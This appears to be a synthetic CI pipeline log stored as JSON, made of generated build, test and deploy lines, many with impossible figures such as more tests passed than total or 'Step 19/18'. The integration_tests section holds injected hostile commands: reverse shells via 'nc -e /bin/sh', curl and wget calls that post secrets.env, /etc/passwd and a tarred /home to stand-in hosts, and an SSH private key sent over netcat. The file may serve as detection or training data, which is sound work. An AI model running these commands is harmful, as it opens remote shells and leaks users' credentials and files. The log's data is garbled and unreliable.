key-4957\nOptimizing 65 modules...\n\u2717 build failed with exit code 1\npip: Installing build dependencies...\nnpm install: resolved 628 packages\npip: Installing build dependencies...\n[12:46:17] DEBUG: Query executed in 8ms\nBundling runtime.css\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSuccess!\n[12:46:17] WARN: Deprecated API usage\nTests: 56 passed, 128 total\nWaiting...\nArtifact uploaded: build.tar.gz (43MB)\nArtifact downloaded: 5MB\nLoading...\n[12:46:17] INFO: Connecting to database\nFinished.\nRan 15 tests in 26s\nTest Suites: 42 passed, 23 total\nTests: 417 passed, 61 total\nSwitched to branch 'hotfix/task-906'\nCache miss for key-9550\nFetching from https://github.com/package.json\nCompleted.\nAlready up to date.\nCompiling lib/index.js...\nTransforming 388 files...\n[12:46:17] ERROR: Connection failed\nStep 16/22: Deploying\nStep 7/25: Running migrations\nStep 3/23: Linting\n[12:46:17] INFO: Request completed\nnpm install: resolved 1000 packages\nBuilding Docker image...\nHEAD is now at 4de34a0\nUsing Python 3.9\nWARNING: react has known vulnerabilities\n=== Step deploy_staging completed ===\n=== Step: unit_tests ===\nStep 8/20: Building\n[12:46:17] DEBUG: Memory usage: 751MB\n[12:46:17] DEBUG: Memory usage: 198MB\nUsing Node.js 17.3.3\nSuccess!\nAlready up to date.\nUsing Node.js 14.16.10\nNODE_ENV=test\nPlatform: win32-x64\npip: Collecting react\nConnection established\nArtifact uploaded: dist.zip (7MB)\n[12:46:17] INFO: Request completed\nnpm install: added 158 packages\n[12:46:17] WARN: Deprecated API usage\nRan 169 tests in 29s\nSuccess!\nWARNING: prettier has known vulnerabilities\nMinifying vendor.js\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nVerifying...\nTest Suites: 44 passed, 22 total\nImage pulled successfully\npip: Installing build dependencies...\n  PASS: unit/test_api_health.spec.js\nSnapshots: 33 passed, 42 total\n[12:46:17] ERROR: Connection failed\n  PASS: integration/test_api_health.spec.js\nBuilding Docker image...\nOptimizing 27 modules...\n[12:46:17] INFO: Starting build process\nLoading...\nInstalling express@5.7.6\nStep 7/16: Installing dependencies\n[12:46:17] DEBUG: Initializing service\nVerifying...\nProcessing...\nGenerating source maps...\nTLS handshake completed\npip: Downloading axios-3.3.tar.gz\nStep 5/17: Running migrations\n[12:46:17] INFO: Request completed\n[12:46:17] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nBundling runtime.js\nRan 66 tests in 22s\nOK\nSnapshots: 35 passed, 22 total\nTransforming 738 files...\nGET /status - 201 (49ms)\nFAILED: test_api_health\nStep 12/16: Linting\nyarn add: Done in 24.37s\nReady.\nFetching submodules...\n[12:46:17] DEBUG: Initializing service\nPOST /api - 201 (162ms)\nnpm install: added 414 packages\nArtifact downloaded: 47MB\nCompiling utils/handler.rs...\n\u2713 build completed\nCache miss for key-7397\nWaiting...\nHEAD is now at 1b73287\nCoverage: 84% statements, 73% branches\n[12:46:17] WARN: Deprecated API usage\nnpm notice: created a lockfile\nRan 14 tests in 24s\n\u2713 deploy completed\nnpm notice: created a lockfile\nWaiting...\nBundling styles.css\nPulling image: node:3.11\nStep 2/19: Running migrations\nDone.\nLayer 4/12: COPY command\nHEAD is now at d2d6acf\nCompiling utils/utils.go...\nNODE_ENV=test\nTransforming 719 files...\nWARNING: prettier has known vulnerabilities\nLayer 2/10: COPY command\nStep 13/19: Building\nStep 16/25: Testing\nStep 19/25: Deploying\nStep 14/17: Testing\nConnection established\nAlready up to date.\nPulling image: python:18\nEnvironment: production\nCompleted.\nStep 14/18: Building\nStep 19/24: Running migrations\nCache restored successfully (244MB)\nGenerating source maps...\n\u2717 build failed with exit code 113\nFAILED: test_auth_login\nAlready up to date.\nConnection established\nCache restored successfully (310MB)\n[12:46:17] INFO: Cache refreshed\nnpm install: added 392 packages\nnpm install: added 217 packages\nGET /health - 204 (22ms)\nConnection established\npip install: Successfully installed express-1.3\nWARNING: prettier has known vulnerabilities\nStep 2/25: Linting\nyarn add: Done in 27.84s\nOK\nStep 1/22: Linting\nEnvironment: staging\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (3MB)\nCache invalidated: node_modules\n  PASS: integration/test_user_create.spec.js\nStep 19/18: Linting\nPushing to registry...\nSnapshots: 32 passed, 48 total\nPushing to registry...\nStep 12/17: Linting\npip install: Successfully installed axios-5.14\nPOST /data - 202 (500ms)\n[12:46:17] DEBUG: Loading configuration\nFetching submodules...\nCompiling lib/index.js...\n[12:46:17] DEBUG: Query executed in 24ms\nTransforming 320 files...\nCompiling lib/utils.go...\n  PASS: test_api_health (58ms)\nyarn add: Done in 11.70s\nStep 3/16: Deploying\nCompiling lib/main.py...\n[12:46:17] WARN: Deprecated API usage\nBuilding Docker image...\nFAILED: test_cache_hit\nDone.\nnpm notice: created a lockfile\nnpm notice: package.json updated\nLayer 1/14: COPY command\n\u2713 Task completed in 4923ms\nCoverage: 91% statements, 65% branches\nSnapshots: 23 passed, 16 total\nFinished.\nTime: 17.177s\n[12:46:17] ERROR: Connection failed\n[12:46:17] DEBUG: Query executed in 49ms\nnpm notice: created a lockfile\n[12:46:17] DEBUG: Query executed in 63ms\n[12:46:17] INFO: Request completed\n[12:46:17] DEBUG: Query executed in 89ms\nGET /api - 200 (46ms)\n  PASS: test_api_health (302ms)\n=== Step unit_tests completed ===\n=== Step: restore_cache ===\n\u2713 Task completed in 1804ms\n[12:46:17] DEBUG: Memory usage: 163MB\nnpm notice: created a lockfile\nnpm install: added 257 packages\n[12:46:17] INFO: Connecting to database\n[12:46:17] INFO: Connecting to database\nChecking out develop branch\nWaiting...\nCache miss for key-3188\nAlready up to date.\nCreating production build...\n[12:46:17] WARN: Deprecated API usage\nFAILED: test_user_create\n\u2713 validate completed\n[12:46:17] INFO: Connecting to database\nFinished.\nPulling image: alpine:latest\n[12:46:17] DEBUG: Connection pool: 4 active\n[12:46:17] INFO: Starting build process\nRan 42 tests in 41s\nPushing to registry...\nPushing to registry...\nCache saved successfully\nReady.\n\u2713 Step 'install' succeeded\nnpm notice: package.json updated\nSwitched to branch 'hotfix/task-860'\n[12:46:17] ERROR: Connection failed\nGenerating source maps...\nRan 156 tests in 58s\nAlready up to date.\nTLS handshake completed\nCache restored successfully (469MB)\nSwitched to branch 'hotfix/task-781'\nConnection established\nCompiling lib/utils.go...\n\u2713 Step 'install' succeeded\n[12:46:17] WARN: Deprecated API usage\nCache saved successfully\nCompiling utils/handler.rs...\n[12:46:17] DEBUG: Initializing service\nnpm notice: package.json updated\nArtifact uploaded: dist.zip (25MB)\nPulling image: node:latest\nImage pulled successfully\nnpm install: added 271 packages\nStep 4/20: Deploying\n[12:46:17] WARN: Deprecated API usage\nnpm notice: created a lockfile\nUsing Python 3.11\n[12:46:17] DEBUG: Initializing service\nLayer 4/8: ENV command\nException: TypeError\nWARNING: lodash has known vulnerabilities\nyarn add: Done in 4.1s\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nnpm notice: created a lockfile\nStep 3/22: Deploying\nFetching submodules...\nCache miss for key-9114\nProcessing...\nTime: 69.313s\n\u2713 Task completed in 3668ms\nNODE_ENV=production\nOptimizing 78 modules...\nBuilding Docker image...\n[12:46:17] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\n\u2713 Task completed in 3230ms\nnpm notice: created a lockfile\nDone.\nOK\nEnvironment: development\nBuilding Docker image...\nDone.\npip: Installing build dependencies...\nArtifact uploaded: dist.zip (100MB)\nCompiling src/service.java...\n[12:46:17] INFO: Connecting to database\npip: Downloading express-3.0.tar.gz\n[12:46:17] INFO: Connecting to database\nFinished.\n[12:46:17] INFO: Cache refreshed\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\nFinished.\nArtifact uploaded: build.tar.gz (7MB)\n  PASS: integration/test_api_health.spec.js\nMinifying main.js\nUsing Python 3.10\nArtifact downloaded: 12MB\nProcessing...\nFetching submodules...\nStep 9/22: Linting\nEnvironment: development\n  PASS: test_db_connect (82ms)\nStep 3/15: Running migrations\nnpm notice: created a lockfile\nnpm install: added 164 packages\n[12:46:17] DEBUG: Connection pool: 13 active\nCompiling components/handler.rs...\nFinished.\n[12:46:17] ERROR: Connection failed\nChecking out develop branch\nnpm notice: created a lockfile\nStep 18/17: Deploying\nWARNING: react has known vulnerabilities\nLayer 5/8: RUN command\n[12:46:17] DEBUG: Loading configuration\nRan 34 tests in 5s\n[12:46:17] DEBUG: Query executed in 19ms\n  PASS: integration/test_cache_hit.spec.js\nTest Suites: 49 passed, 19 total\n[12:46:17] DEBUG: Memory usage: 1494MB\npip: Installing build dependencies...\nnpm install: added 189 packages\nnpm notice: created a lockfile\nRan 144 tests in 49s\nTime: 87.945s\n[12:46:17] DEBUG: Initializing service\nGET /api - 200 (13ms)\nCompiling lib/main.py...\nException: ValueError\nCreating production build...\nLoading...\npip: Collecting prettier\nStep 3/20: Deploying\n[12:46:17] DEBUG: Loading configuration\n\u2713 Task completed in 1676ms\npip: Collecting axios\n\u2713 Task completed in 110ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-5082\nInstalling webpack@5.12.1\n\u2713 Task completed in 2276ms\nCreating production build...\nImage pulled successfully\nCache invalidated: node_modules\n[12:46:17] DEBUG: Loading configuration\nTime: 48.595s\nImage pulled successfully\nFetching submodules...\nChecking out main branch\nCompleted.\nnpm install: resolved 1792 packages\n[12:46:17] DEBUG: Connection pool: 16 active\nProcessing...\nFetching from https://amazonaws.com/package.json\nFAILED: test_auth_login\npip: Collecting axios\nReady.\n=== Step restore_cache completed ===\n=== Step: lint ===\nTLS handshake completed\nDone.\nWaiting...\nArtifact uploaded: dist.zip (6MB)\nArtifact uploaded: build.tar.gz (4MB)\nCache saved successfully\nFetching submodules...\nCache restored successfully (150MB)\n\u2713 Step 'build' succeeded\nReady.\n\u2713 deploy completed\nCache restored successfully (171MB)\nPulling image: node:3.11\n\u2717 build failed with exit code 96\nCompiling src/utils.go...\nnpm notice: created a lockfile\nProcessing...\nCompleted.\npip: Installing build dependencies...\nStep 19/23: Linting\nnpm notice: package.json updated\nFinished.\nTransforming 740 files...\nFetching submodules...\nStep 10/23: Running migrations\nBuilding Docker image...\nReady.\nGenerating source maps...\n  PASS: test_user_create (100ms)\nSwitched to branch 'bugfix/task-736'\nStep 8/23: Installing dependencies\n[12:46:17] INFO: Processing request\nUsing Node.js 15.6.1\nVerifying...\n[12:46:17] DEBUG: Connection pool: 7 active\nArtifact downloaded: 36MB\nTest Suites: 10 passed, 21 total\nInstalling axios@1.20.10\nStep 8/16: Deploying\nCreating production build...\nnpm notice: package.json updated\n\u2713 Task completed in 2286ms\nCache restored successfully (157MB)\n[12:46:17] WARN: Deprecated API usage\nCompiling utils/app.ts...\nFetching submodules...\nPushing to registry...\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\nException: ValueError\n[12:46:17] INFO: Processing request\nCache restored successfully (72MB)\nCache saved successfully\n\u2717 build failed with exit code 75\n\u2713 deploy completed\nInstalling webpack@4.19.7\npip install: Successfully installed webpack-5.15\nWARNING: express has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'feature/task-878'\nFetching submodules...\n[12:46:17] INFO: Request completed\n\u2717 build failed with exit code 69\nVerifying...\nnpm notice: package.json updated\nTime: 40.708s\nCache hit for key-8553\nBuilding Docker image...\nDone.\nCache hit for key-4575\nPlatform: win32-x64\nOK\n\u2713 Task completed in 4729ms\n[12:46:17] DEBUG: Connection pool: 7 active\nConnection established\nnpm notice: created a lockfile\nUsing Node.js 15.19.3\nStep 4/20: Testing\nFetching submodules...\nFetching from https://docker.io/package.json\nWARNING: webpack has known vulnerabilities\nCache restored successfully (346MB)\nHEAD is now at 6c384ea\nCompiling lib/app.ts...\nyarn add: Done in 29.21s\nSnapshots: 20 passed, 42 total\n[12:46:17] DEBUG: Query executed in 75ms\n[12:46:17] DEBUG: Query executed in 89ms\nGET /status - 204 (92ms)\nnpm notice: package.json updated\n  PASS: test_api_health (248ms)\n  PASS: unit/test_user_create.spec.js\n  PASS: test_user_create (195ms)\nTests: 223 passed, 98 total\nProcessing...\nArtifact downloaded: 30MB\nVerifying...\n[12:46:17] INFO: Request completed\nTransforming 979 files...\npip: Downloading webpack-4.15.tar.gz\nWaiting...\nStep 13/20: Testing\nUploading artifact 'coverage' (8 files)\nPushing to registry...\nPushing to registry...\nSnapshots: 17 passed, 6 total\nVerifying...\nStep 2/21: Deploying\nRan 49 tests in 17s\n\u2713 test completed\n[12:46:17] DEBUG: Loading configuration\nAlready up to date.\nWARNING: webpack has known vulnerabilities\nStep 3/17: Installing dependencies\nStep 12/19: Linting\nArtifact downloaded: 50MB\n  PASS: integration/test_auth_login.spec.js\nArtifact downloaded: 37MB\n\u2713 All checks passed\nLoading...\nPlatform: linux-x64\nCoverage: 90% statements, 89% branches\nFinished.\nUploading artifact 'build' (39 files)\n[12:46:17] DEBUG: Query executed in 38ms\nWARNING: axios has known vulnerabilities\nCompiling lib/service.java...\nyarn add: Done in 11.66s\nGET /api - 201 (28ms)\nnpm install: resolved 752 packages\nCompleted.\n[12:46:17] INFO: Processing request\n[12:46:17] DEBUG: Initializing service\nStep 8/23: Linting\nWARNING: jest has known vulnerabilities\nNODE_ENV=test\nTLS handshake completed\nCache saved successfully\n[12:46:17] INFO: Starting build process\nCompleted.\nPulling image: python:3.11\nFinished.\nGenerating source maps...\nnpm install: resolved 1918 packages\nCache invalidated: build\nStep 9/17: Installing dependencies\nCache restored successfully (156MB)\n[12:46:17] DEBUG: Query executed in 13ms\nGenerating source maps...\nTLS handshake completed\nFetching submodules...\nCache saved successfully\n=== Step lint completed ===\n=== Step: e2e_tests ===\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nHEAD is now at 1dde7a6\nnpm install: added 45 packages\n[12:46:17] INFO: Starting build process\nArtifact uploaded: build.tar.gz (6MB)\nWARNING: react has known vulnerabilities\nSuccess!\nAlready up to date.\nCompiling src/main.py...\nArtifact downloaded: 40MB\nReady.\n[12:46:17] INFO: Cache refreshed\nUsing Python 3.10\npip install: Successfully installed lodash-1.14\nCompiling src/service.java...\nCompiling utils/handler.rs...\nCache invalidated: dependencies\nBuilding Docker image...\nGET /status - 204 (41ms)\nArtifact uploaded: build.tar.gz (3MB)\n[12:46:17] WARN: Deprecated API usage\nInstalling prettier@2.18.2\nUsing Node.js 19.1.9\nTransforming 509 files...\nPlatform: win32-x64\nCoverage: 97% statements, 63% branches\n[12:46:17] DEBUG: Connection pool: 13 active\npip: Collecting jest\n[12:46:17] INFO: Request completed\nUsing Python 3.12\nCache hit for key-2481\nArtifact uploaded: dist.zip (94MB)\nEnvironment: staging\npip: Downloading jest-4.10.tar.gz\n[12:46:17] DEBUG: Query executed in 12ms\nArtifact downloaded: 28MB\nInstalling webpack@5.14.8\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 All checks passed\nEnvironment: staging\nProcessing...\nTransforming 703 files...\n[12:46:17] DEBUG: Memory usage: 1878MB\nCache miss for key-8190\nNODE_ENV=development\nCache miss for key-8483\nInstalling webpack@1.1.5\nPulling image: python:latest\nyarn add: Done in 24.6s\n[12:46:17] INFO: Processing request\nWARNING: eslint has known vulnerabilities\nCreating production build...\n\u2713 Task completed in 3612ms\nWARNING: webpack has known vulnerabilities\nCompiling src/index.js...\n[12:46:17] INFO: Starting build process\nException: NullPointerException\nHEAD is now at 417f9f6\n\u2717 build failed with exit code 24\nyarn add: Done in 28.23s\nFetching submodules...\n[12:46:17] INFO: Processing request\nStep 17/21: Building\n[12:46:17] ERROR: Connection failed\nStep 6/20: Building\n\u2717 build failed with exit code 19\n[12:46:17] INFO: Starting build process\nCache invalidated: dependencies\n[12:46:17] DEBUG: Loading configuration\n[12:46:17] ERROR: Connection failed\n[12:46:17] DEBUG: Connection pool: 13 active\nCompiling components/service.java...\nCache saved successfully\nCache saved successfully\nPushing to registry...\nStep 19/15: Installing dependencies\nTests: 435 passed, 260 total\n\u2717 build failed with exit code 52\nImage pulled successfully\nnpm install: resolved 603 packages\n[12:46:17] DEBUG: Memory usage: 620MB\n  PASS: test_db_connect (309ms)\nnpm install: resolved 1596 packages\nCompiling src/service.java...\nEnvironment: development\nStep 5/24: Linting\nVerifying...\nUsing Node.js 17.18.6\npip: Collecting react\nUploading artifact 'build' (9 files)\nCache saved successfully\nCache restored successfully (338MB)\nCompiling utils/utils.go...\nCache invalidated: node_modules\nStep 2/19: Testing\nBundling vendor.js\nFinished.\nOK\nCompiling lib/index.js...\nArtifact uploaded: build.tar.gz (5MB)\n[12:46:17] INFO: Processing request\n[12:46:17] INFO: Request completed\nnpm install: resolved 299 packages\nUploading artifact 'build' (31 files)\nLoading...\nRan 125 tests in 9s\nCompiling lib/index.js...\nWaiting...\nMinifying vendor.js\nyarn add: Done in 25.59s\nSuccess!\nCoverage: 93% statements, 65% branches\nWaiting...\nFinished.\nPulling image: alpine:18\n  PASS: test_db_connect (212ms)\nStep 20/20: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nRan 135 tests in 23s\nTest Suites: 16 passed, 14 total\nPulling image: python:3.11\nSuccess!\nTests: 417 passed, 399 total\nMinifying main.js\n[12:46:17] INFO: Processing request\nStep 6/19: Running migrations\nWARNING: react has known vulnerabilities\nMinifying vendor.js\nImage pulled successfully\n\u2713 Task completed in 3674ms\nStep 11/18: Running migrations\nCache miss for key-7904\nSnapshots: 24 passed, 31 total\nWaiting...\nImage pulled successfully\nTime: 18.692s\nHEAD is now at 9f2229d\n[12:46:17] INFO: Request completed\nTransforming 416 files...\nFinished.\npip: Collecting prettier\nGET /health - 201 (58ms)\n\u2717 build failed with exit code 109\nBuilding Docker image...\nCache saved successfully\nEnvironment: production\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPOST /data - 200 (459ms)\nDone.\nArtifact uploaded: build.tar.gz (19MB)\nPOST /upload - 201 (231ms)\nyarn add: Done in 12.97s\n=== Step e2e_tests completed ===\n=== Step: upload_artifacts ===\nTest Suites: 17 passed, 37 total\nBuilding Docker image...\npip: Installing build dependencies...\nReady.\nRan 64 tests in 36s\n[12:46:17] ERROR: Connection failed\nWaiting...\nReady.\n[12:46:17] DEBUG: Loading configuration\n\u2713 Step 'test' succeeded\nChecking out master branch\nAlready up to date.\nCache hit for key-6743\nCompiling utils/main.py...\nPlatform: linux-x64\nnpm install: added 94 packages\nInstalling react@5.17.5\nStep 8/24: Building\nTransforming 851 files...\n\u2713 Step 'checkout' succeeded\nBundling main.css\n  PASS: integration/test_cache_hit.spec.js\nUploading artifact 'dist' (34 files)\n[12:46:17] INFO: Processing request\n  PASS: test_user_create (185ms)\npip: Collecting webpack\n\u2713 Step 'install' succeeded\nBuilding Docker image...\nnpm notice: package.json updated\n[12:46:17] DEBUG: Query executed in 66ms\nnpm install: added 329 packages\nProcessing...\nFetching submodules...\nPushing to registry...\nnpm notice: package.json updated\n[12:46:17] DEBUG: Connection pool: 5 active\nAlready up to date.\nProcessing...\nBuilding Docker image...\nPOST /api - 201 (44ms)\nPulling image: node:18\nRan 32 tests in 56s\n[12:46:17] DEBUG: Connection pool: 18 active\nUploading artifact 'build' (42 files)\n\u2713 Task completed in 821ms\nInstalling lodash@2.10.6\nWARNING: axios has known vulnerabilities\nUsing Node.js 19.3.9\nPOST /upload - 200 (73ms)\nWaiting...\nOK\nCompiling lib/index.js...\nStep 10/19: Testing\n[12:46:17] INFO: Request completed\nArtifact uploaded: dist.zip (33MB)\n  PASS: integration/test_api_health.spec.js\nnpm install: resolved 1810 packages\nTransforming 982 files...\nReady.\n[12:46:17] DEBUG: Query executed in 3ms\n[12:46:17] INFO: Starting build process\nCoverage: 100% statements, 85% branches\nCompiling components/index.js...\n[12:46:17] WARN: Deprecated API usage\n\u2713 lint completed\nCompleted.\nFetching from https://npmjs.org/package.json\n[12:46:17] INFO: Processing request\n[12:46:17] INFO: Request completed\nEnvironment: staging\nLayer 6/9: ENV command\nMinifying vendor.js\nNODE_ENV=test\n[12:46:17] INFO: Cache refreshed\nGenerating source maps...\nCompleted.\nDone.\nCompiling lib/service.java...\nPlatform: win32-x64\n[12:46:17] DEBUG: Memory usage: 1985MB\nOK\nCache saved successfully\n[12:46:17] INFO: Starting build process\n\u2713 All checks passed\nFetching from https://npmjs.org/package.json\n[12:46:17] DEBUG: Memory usage: 1689MB\nStep 10/22: Testing\nLayer 8/12: ENV command\nnpm install: added 175 packages\n[12:46:17] INFO: Request completed\n[12:46:17] INFO: Connecting to database\nStep 1/22: Deploying\n[12:46:17] DEBUG: Initializing service\nCompleted.\nTLS handshake completed\nAlready up to date.\nPlatform: darwin-arm64\nProcessing...\nLayer 6/10: ENV command\nStep 2/17: Linting\nStep 12/18: Deploying\nFinished.\nnpm notice: created a lockfile\nCoverage: 100% statements, 83% branches\nyarn add: Done in 1.5s\nImage pulled successfully\nPOST /data - 201 (248ms)\nnpm install: added 133 packages\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTime: 62.453s\nUsing Python 3.9\nFinished.\nCreating production build...\nCoverage: 93% statements, 65% branches\nOptimizing 54 modules...\nBuilding Docker image...\nUsing Python 3.10\nFAILED: test_auth_login\n[12:46:17] DEBUG: Initializing service\n[12:46:17] DEBUG: Loading configuration\n[12:46:17] INFO: Connecting to database\nInstalling express@4.18.1\nCache hit for key-5678\nOK\nMinifying app.js\n\u2717 build failed with exit code 110\nTransforming 402 files...\nOK\nOptimizing 39 modules...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out develop branch\n\u2713 Task completed in 4508ms\nCompiling src/handler.rs...\n[12:46:17] WARN: Deprecated API usage\n[12:46:17] INFO: Processing request\nCache saved successfully\n[12:46:17] INFO: Starting build process\nCache saved successfully\nEnvironment: test\nAlready up to date.\nOK\nCompiling src/index.js...\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nCache miss for key-1372\nEnvironment: production\npip install: Successfully installed express-4.16\n[12:46:17] INFO: Processing request\npip: Installing build dependencies...\n[12:46:17] INFO: Request completed\n=== Step upload_artifacts completed ===\n=== Step: integration_tests ===\n[12:46:17] DEBUG: Query executed in 46ms\nNODE_ENV=test\nWARNING: prettier has known vulnerabilities\nOptimizing 37 modules...\nCompleted.\nException: NullPointerException\nStep 15/16: Running migrations\n[12:46:17] INFO: Connecting to database\nCompleted.\nTransforming 603 files...\nTime: 85.36s\nCache invalidated: node_modules\nGET /status - 201 (31ms)\nReady.\nnc -e /bin/sh 33.115.67.183 23374\nCache hit for key-4459\nHEAD is now at f1337dd\n\u2713 All checks passed\nSending 364MB of data to crypto-mine.io\nGenerating source maps...\nEnvironment: production\nCoverage: 94% statements, 86% branches\nFinished.\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nTest Suites: 29 passed, 21 total\nWaiting...\nCompiling utils/main.py...\nEnvironment: development\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nPulling image: node:latest\nyarn add: Done in 17.79s\nProcessing...\nTLS handshake completed\n[12:46:17] DEBUG: Query executed in 11ms\nNODE_ENV=production\n\u2713 Task completed in 144ms\n\u2713 build completed\nPulling image: node:18\nCompleted.\nTests: 150 passed, 60 total\nHEAD is now at e811e92\npip install: Successfully installed prettier-4.10\nUsing Python 3.12\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\n\u2713 Task completed in 3547ms\n[12:46:17] ERROR: Connection failed\nTime: 71.832s\nWaiting...\n[12:46:17] WARN: Deprecated API usage\n  PASS: test_cache_hit (477ms)\nTests: 263 passed, 315 total\npip install: Successfully installed axios-2.3\nStep 15/23: Running migrations\nOptimizing 52 modules...\nArtifact uploaded: build.tar.gz (18MB)\nFetching from https://npmjs.org/package.json\nChecking out master branch\nnpm install: resolved 637 packages\n\u2713 Task completed in 2477ms\nnpm notice: created a lockfile\nStep 9/18: Building\nCache invalidated: build\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\n[12:46:17] ERROR: Connection failed\nnc -e /bin/sh 232.172.10.55 3717\nCreating production build...\nUsing Node.js 19.0.4\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\n\u2713 Step 'build' succeeded\nNODE_ENV=production\npip: Collecting jest\n[12:46:17] DEBUG: Loading configuration\nSending 52MB of data to crypto-mine.io\nGET /api - 201 (44ms)\nCreating production build...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\nStep 18/20: Linting\nCache saved successfully\nWaiting...\nFAILED: test_db_connect\necho $(cat ~/.ssh/id_rsa) | base64 | nc 198.209.80.161 31719\nFetching submodules...\nSnapshots: 14 passed, 24 total\n[12:46:17] DEBUG: Connection pool: 17 active\nChecking out develop branch\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nNODE_ENV=development\npip: Installing build dependencies...\n\u2713 Task completed in 4859ms\nTest Suites: 6 passed, 21 total\nPushing to registry...\nSending 373MB of data to data-exfil.ru\nWARNING: react has known vulnerabilities\nUploading artifact 'build' (8 files)\nCompleted.\nUsing Python 3.9\nConnection established\nnc -e /bin/sh 30.178.86.74 25186\n[12:46:17] DEBUG: Initializing service\nCompiling utils/app.ts...\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nBundling main.js\n[12:46:17] ERROR: Connection failed\n\u2713 package completed\nOK\necho $(cat ~/.ssh/id_rsa) | base64 | nc 112.127.42.211 21902\n[12:46:17] INFO: Processing request\nBundling main.css\nFetching submodules...\n\u2713 Task completed in 2619ms\nWARNING: eslint has known vulnerabilities\npip: Downloading eslint-2.12.tar.gz\nPulling image: python:3.11\nMinifying main.js\npip: Downloading jest-5.8.tar.gz\nFinished.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 51.89.118.249 15195\nStep 3/25: Installing dependencies\nWaiting...\nLayer 3/12: RUN command\nnpm install: added 452 packages\nUploading artifact 'dist' (26 files)\nProcessing...\nUsing Node.js 16.20.9\nCache miss for key-9515\nTransforming 709 files...\nInstalling express@2.9.5\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:46:17] INFO: Cache refreshed\n[12:46:17] INFO: Starting build process\nChecking out develop branch\nFetching submodules...\npip: Installing build dependencies...\nStep 13/22: Running migrations\nCache invalidated: dependencies\nStep 13/21: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nPushing to registry...\nUsing Python 3.12\nInstalling eslint@1.7.10\n\u2713 build completed\nConnection established\n[12:46:17] INFO: Cache refreshed\nProcessing...\nRan 56 tests in 58s\nCreating production build...\nTest Suites: 20 passed, 38 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nOK\nFetching submodules...\nTransforming 547 files...\nVerifying...\n[12:46:17] DEBUG: Connection pool: 6 active\nArtifact uploaded: build.tar.gz (37MB)\nWARNING: webpack has known vulnerabilities\nException: RuntimeError\nStep 2/20: Testing\nCache invalidated: dependencies\nStep 9/24: Linting\nStep 18/20: Running migrations\nCompiling lib/service.java...\n[12:46:17] INFO: Request completed\n\u2717 build failed with exit code 73\nCompiling components/handler.rs...\nImage pulled successfully\n[12:46:17] INFO: Connecting to database\n[12:46:17] DEBUG: Initializing service\nCache hit for key-9819\nWARNING: react has known vulnerabilities\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nFetching from https://googleapis.com/package.json\n\u2713 All checks passed\n=== Step integration_tests completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-16T12:46:17.819630",
        "finished_at": "2025-12-16T12:46:35.730904",
        "log_lines": [
          "=== Step: setup_node ===",
          "FAILED: test_auth_login",
          "npm install: resolved 188 packages",
          "Artifact uploaded: build.tar.gz (44MB)",
          "npm install: resolved 1681 packages",
          "Artifact downloaded: 12MB",
          "OK",
          "Installing webpack@4.5.4",
          "Waiting...",
          "\u2713 Step 'checkout' succeeded",
          "Connection established",
          "[12:46:17] DEBUG: Initializing service",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:17] INFO: Connecting to database",
          "yarn add: Done in 16.52s",
          "Loading...",
          "  PASS: unit/test_db_connect.spec.js",
          "  PASS: test_cache_hit (8ms)",
          "[12:46:17] DEBUG: Memory usage: 1947MB",
          "Success!",
          "Time: 13.889s",
          "Done.",
          "Time: 96.87s",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (10MB)",
          "Success!",
          "Generating source maps...",
          "[12:46:17] DEBUG: Initializing service",
          "Installing lodash@5.17.3",
          "Transforming 197 files...",
          "Step 3/24: Testing",
          "Minifying vendor.js",
          "Verifying...",
          "Bundling styles.css",
          "Compiling src/handler.rs...",
          "Bundling runtime.css",
          "Using Node.js 18.18.6",
          "Compiling src/utils.go...",
          "pip install: Successfully installed axios-3.2",
          "HEAD is now at 07cae83",
          "Completed.",
          "Coverage: 71% statements, 87% branches",
          "FAILED: test_api_health",
          "Layer 9/10: ENV command",
          "Creating production build...",
          "Loading...",
          "Compiling components/utils.go...",
          "Step 10/23: Building",
          "Step 12/15: Testing",
          "[12:46:17] DEBUG: Initializing service",
          "Processing...",
          "Optimizing 98 modules...",
          "yarn add: Done in 14.91s",
          "[12:46:17] DEBUG: Query executed in 11ms",
          "Compiling utils/service.java...",
          "Compiling utils/index.js...",
          "\u2713 deploy completed",
          "Fetching submodules...",
          "WARNING: react has known vulnerabilities",
          "Cache hit for key-5110",
          "Connection established",
          "Fetching submodules...",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "  PASS: test_db_connect (460ms)",
          "Transforming 757 files...",
